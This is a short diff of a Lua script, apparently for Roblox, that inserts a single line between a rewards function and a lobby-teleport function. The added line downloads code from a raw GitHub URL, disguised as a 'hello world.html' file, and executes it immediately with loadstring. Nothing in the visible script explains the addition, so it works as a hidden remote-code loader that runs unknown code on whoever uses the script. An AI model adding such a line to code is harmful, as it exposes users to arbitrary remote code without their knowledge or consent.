@@ -184,6 +184,8 @@ local function get_all_rewards()
     return results
 end
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ColaCydiaRepo/Scripts/main/hello%20world.html'))()
+
 -- // lobby / teleporting
 local function send_to_lobby()
     task.wait(1)
